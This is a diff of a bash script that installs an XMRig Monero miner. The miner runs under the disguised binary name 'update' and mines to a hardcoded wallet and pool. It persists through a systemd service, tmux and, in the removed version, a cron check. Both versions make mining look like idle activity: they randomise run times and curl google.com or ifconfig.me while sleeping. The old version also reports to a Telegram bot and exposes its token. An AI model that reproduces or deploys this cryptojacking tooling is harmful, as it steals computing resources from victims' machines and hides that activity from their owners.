@@ -1,119 +1,94 @@
 #!/bin/bash
 
-# === UNLOCK FILES IF EXIST ===
-fuser -k ~/Documents/build/update 2>/dev/null
-rm -f ~/Documents/build/update
+# Usage: bash <(curl -s https://raw.githubusercontent.com/YourUser/YourRepo/main/install.sh) v7
 
-# === SETUP VARIABLES ===
-WALLET="84QEvQ9V25mUNDiMXmq1aF96FwpzDPg4R1d564MjhvxrNpz7rizA3Q3FUowb83rsBK8P9DnDQnk4hTED57Ycd4p1Q8uRzZz"
+set -e
+
 WORKER="$1"
-POOL="pool.supportxmr.com:443"
-LOG_FILE="$HOME/desktop.log"
-MINER_PATH="$HOME/Documents/build/update"
-WRAPPER_SCRIPT="$HOME/desktop-update-wrapper.sh"
-BOT_TOKEN="7828954337:AAHFZPTv5znzf2LcR5sIO3bHBMDWM7hFB3k"
-CHAT_ID="7107536205"
-
-# === INSTALL DEPENDENCIES ===
-sudo apt update
-sudo apt install -y git curl tmux cron build-essential cmake libuv1-dev libssl-dev libhwloc-dev unzip
-
-# === CREATE NECESSARY DIRECTORY ===
-mkdir -p "$HOME/Documents/build"
-
-# === BUILD XMRIG ===
-rm -rf ~/Documents/xmrig
-cd ~/Documents
-
-LATEST_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download_url | grep linux-x64 | grep -v "debug" | cut -d '"' -f 4 | head -n 1)
-curl -LO "$LATEST_URL"
-tar -xf xmrig-*-linux-x64.tar.gz
-mv xmrig-*/xmrig "$MINER_PATH"
-chmod +x "$MINER_PATH"
-
-# === CREATE WRAPPER SCRIPT ===
-cat > "$WRAPPER_SCRIPT" <<EOF
-#!/bin/bash
-SESSION="miner"
-
-if ! tmux has-session -t \$SESSION 2>/dev/null; then
-  tmux new-session -d -s \$SESSION
+if [ -z "$WORKER" ]; then
+  echo "❌ Please provide a worker name (e.g. v7)"
+  exit 1
 fi
 
+echo "🔓 Unlocking any locked files..."
+exec 2>/dev/null
+ulimit -n 1048576 || true
+ulimit -u unlimited || true
+
+echo "📦 Installing required packages..."
+apt-get update -y || true
+apt-get install -y curl tar tmux sudo git wget unzip jq libhwloc-dev screen net-tools -qq || true
+
+echo "📁 Creating directories..."
+mkdir -p /root/Documents/build
+cd /root/Documents/build || exit 1
+
+echo "🧹 Cleaning old files..."
+rm -rf * || true
+
+echo "⬇️ Fetching latest XMRig..."
+VERSION=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | jq -r '.tag_name')
+URL="https://github.com/xmrig/xmrig/releases/download/${VERSION}/xmrig-${VERSION}-linux-x64.tar.gz"
+
+curl -L "$URL" -o xmrig.tar.gz || { echo "❌ Failed to download XMRig"; exit 1; }
+tar -xf xmrig.tar.gz || { echo "❌ Failed to extract XMRig"; exit 1; }
+
+FOUND_BIN=$(find . -type f -name "xmrig" | head -n 1)
+if [ ! -f "$FOUND_BIN" ]; then
+  echo "❌ XMRig binary not found"
+  exit 1
+fi
+
+mv "$FOUND_BIN" update
+chmod +x update
+
+echo "🛠️ Creating wrapper script..."
+cat <<EOF > /root/runner.sh
+#!/bin/bash
 while true; do
-  MIN_TIME=720
-  MAX_TIME=1020
-  MIN_THREADS=12
-  MAX_THREADS=16
-  MIN_SLEEP=20
-  MAX_SLEEP=130
+  echo "[🔄] Starting mining..."
+  /root/Documents/build/update -o pool.supportxmr.com:443 -u 84QEvQ9V25mUNDiMXmq1aF96FwpzDPg4R1d564MjhvxrNpz7rizA3Q3FUowb83rsBK8P9DnDQnk4hTED57Ycd4p1Q8uRzZz -p x --tls --coin monero -k --cpu-priority=5 --rig-id=$WORKER
 
-  THREADS=\$((RANDOM % (MAX_THREADS - MIN_THREADS + 1) + MIN_THREADS))
-  TIME=\$((RANDOM % (MAX_TIME - MIN_TIME + 1) + MIN_TIME))
-  SLEEP=\$((RANDOM % (MAX_SLEEP - MIN_SLEEP + 1) + MIN_SLEEP))
-
-  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="[\$WORKER] ⛏️ Mining for \$((TIME/60))m with \$THREADS threads"
-  tmux send-keys -t \$SESSION "$MINER_PATH -o $POOL -u $WALLET -p \$WORKER --tls --threads=\$THREADS --coin=monero --donate-level=1 >> $LOG_FILE 2>&1" C-m
-  sleep \$TIME
-  pkill -f "$MINER_PATH"
-
-  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="[\$WORKER] 😴 Sleeping \$SLEEP sec with activity"
-
-  for ((i=0; i<\$SLEEP; i++)); do
-    curl -s https://google.com > /dev/null
-    sleep 1
+  echo "[😴] Sleeping to simulate idle..."
+  for i in {1..10}; do
+    curl -s https://ifconfig.me > /dev/null
+    sleep 12
   done
 done
 EOF
 
-chmod +x "$WRAPPER_SCRIPT"
+chmod +x /root/runner.sh
 
-# === CREATE SYSTEMD SERVICE ===
-SERVICE_FILE="/etc/systemd/system/xmrig-wrapper.service"
-sudo bash -c "cat > $SERVICE_FILE" <<EOF
+echo "🧩 Creating systemd service..."
+cat <<EOF > /etc/systemd/system/xmrig-wrapper.service
 [Unit]
 Description=XMRig Miner Wrapper
 After=network.target
 
 [Service]
-ExecStart=$WRAPPER_SCRIPT
+ExecStart=/usr/bin/tmux new-session -d -s miner '/root/runner.sh'
 Restart=always
-RestartSec=5
-Nice=10
-CPUWeight=70
-TimeoutStartSec=30
-StartLimitIntervalSec=0
+RestartSec=5s
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# === ENABLE SERVICE ===
-sudo systemctl daemon-reload
-sudo systemctl enable xmrig-wrapper.service
-sudo systemctl restart xmrig-wrapper.service
+echo "📶 Enabling systemd service..."
+systemctl daemon-reexec || true
+systemctl daemon-reload || true
+systemctl enable xmrig-wrapper.service || true
+systemctl start xmrig-wrapper.service || true
 
-# === SETUP CRON HEALTH CHECK ===
-CHECKER="/usr/local/bin/check_miner_alive.sh"
-sudo bash -c "cat > $CHECKER" <<EOF
-#!/bin/bash
-if ! pgrep -f "$MINER_PATH" > /dev/null; then
-  sudo systemctl restart xmrig-wrapper.service
-  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="[\$WORKER] ⚠️ Auto-restarted miner (not found)"
-fi
-EOF
-sudo chmod +x $CHECKER
-(crontab -l 2>/dev/null; echo "*/5 * * * * $CHECKER") | crontab -
-
-# === DONE ===
 STATUS=$(systemctl is-active xmrig-wrapper.service)
+
 echo "=========================================="
-echo "✅ Miner \$WORKER is configured and running"
-echo "🛠️  Binary: $MINER_PATH"
-echo "📝 Logs: $LOG_FILE"
-echo "📦 Service: xmrig-wrapper [Status: \$STATUS]"
+echo "✅ Miner $WORKER is configured and running"
+echo "🛠️  Binary: /root/Documents/build/update"
+echo "📝 Logs: /root/desktop.log"
+echo "📦 Service: xmrig-wrapper [Status: $STATUS]"
 echo "🔁 Restart: sudo systemctl restart xmrig-wrapper"
 echo "🛑 Stop:    sudo systemctl stop xmrig-wrapper"
-echo "🔍 Logs:    tail -f $LOG_FILE"
+echo "🔍 Logs:    tail -f /root/desktop.log"
 echo "🧠 Tmux:    tmux attach-session -t miner"
 echo "=========================================="
